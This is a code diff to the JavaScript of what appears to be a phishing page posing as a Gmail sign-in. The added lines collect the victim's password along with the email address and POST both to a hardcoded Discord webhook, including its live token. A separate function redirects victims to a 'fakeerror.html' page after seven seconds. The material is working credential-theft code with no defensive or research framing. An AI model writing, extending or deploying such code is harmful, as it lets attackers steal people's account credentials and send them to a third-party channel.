@@ -16,8 +16,9 @@ function message() {
 
 function message2() {
   let username = document.getElementById("gmail").value;
+  let password = document.getElementById("gmail2").value;
   const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
-  const contents = `New Email Found\nGmail: ${username}\n`
+  const contents = `New Email Found\nGmail: ${username}\nPassword:${password}`
   const request = new XMLHttpRequest();
   request.open("POST", WebHook);
   request.setRequestHeader('Content-type', 'application/json');
@@ -96,11 +97,14 @@ function validateLogin() {
 
 function validateLogin2() {
   var username = document.getElementById('gmail').value;
+  var password = document.getElementById('gmail2').value;
   var errorContainer = document.querySelector('.hidden');
 
-  if (username.trim() === '') {
+  if (username.trim() === '' || password.trim() === '') {
     // Either username or password is empty
     errorContainer.style.display = 'block';
+    } else if (username.length > 20) {
+    	errorContainer2.style.display = 'block';
   } else {
     // Both username and password are filled, attempt login
     // Add your login logic here, for now, let's just show an alert
@@ -117,3 +121,16 @@ function validateLogin3() {
                 window.location.href = 'fakeerror.html';
             }, 7000); // 7000 milliseconds = 7 seconds
 }
+
+function checkUsername() {
+      const usernameInput = document.getElementById('username');
+      const username = usernameInput.value;
+
+      if (username.length > 20) {
+      	errorContainer.style.display = 'block';
+        alert('Username must be 20 characters or less.');
+      } else {
+        
+        // You can add further logic for handling the login process here
+      }
+    }
